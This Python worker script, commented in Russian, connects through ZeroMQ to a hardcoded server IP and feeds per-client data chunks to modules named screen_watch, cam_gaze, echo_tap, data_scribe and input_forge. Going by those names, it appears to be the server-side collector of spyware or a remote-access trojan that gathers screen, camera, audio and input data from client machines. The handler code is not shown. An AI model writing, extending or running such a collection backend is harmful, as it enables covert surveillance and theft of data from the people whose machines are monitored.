import asyncio
import json
import zmq
import zmq.asyncio
import multiprocessing
from loguru import logger

# TCP адрес ZeroMQ PUSH-сокета сервера
ZMQ_PULL_ADDR = "tcp://188.190.156.120:5555"


async def worker_task(worker_id: str):
    """Асинхронный воркер, получает header + чанки через ZeroMQ и обрабатывает их"""
    # --- Каждый воркер создаёт свой контекст ---
    zmq_ctx = zmq.asyncio.Context()
    pull_socket = zmq_ctx.socket(zmq.PULL)
    pull_socket.connect(ZMQ_PULL_ADDR)

    # --- Импортируем модули внутри воркера ---
    from modules import module_map, data_scribe, screen_watch, bin_stream, echo_tap, cam_gaze, input_forge

    logger.info(f"[+] Worker {worker_id} started and connected to {ZMQ_PULL_ADDR}")

    while True:
        try:
            # --- Получаем header ---
            header_bytes = await pull_socket.recv()
            header = json.loads(header_bytes)

            client_id = header.get("client_id", "?")
            module_name = header.get("module_name", "")
            payload_len = header.get("payload_len", 0)
            chunk_count = header.get("chunk_count", 0)

            logger.info(f"[Worker {worker_id}] Received module '{module_name}' from client {client_id} "
                        f"({payload_len} bytes, {chunk_count} chunks)")

            func = module_map.get(module_name)
            if not func:
                logger.warning(f"[Worker {worker_id}] Unknown module '{module_name}' from client {client_id}")
                # Пропускаем все чанки
                for _ in range(chunk_count):
                    await pull_socket.recv()
                continue

            # --- Обрабатываем чанки по одному ---
            for idx in range(chunk_count):
                chunk = await pull_socket.recv()
                try:
                    func(chunk)
                except Exception as e:
                    logger.error(f"[Worker {worker_id}] Error processing chunk {idx+1}/{chunk_count} of "
                                 f"module '{module_name}': {e}")

            logger.info(f"[Worker {worker_id}] Finished module '{module_name}' from client {client_id}")

        except Exception as e:
            logger.error(f"[Worker {worker_id}] General error: {e}")
            # Небольшая пауза, чтобы не зацикливать loop при ошибках
            await asyncio.sleep(0.1)


def module_worker():
    """Запуск asyncio loop для воркера в отдельном процессе"""
    # Используем имя процесса как ID воркера
    worker_id = multiprocessing.current_process().name
    asyncio.run(worker_task(worker_id))
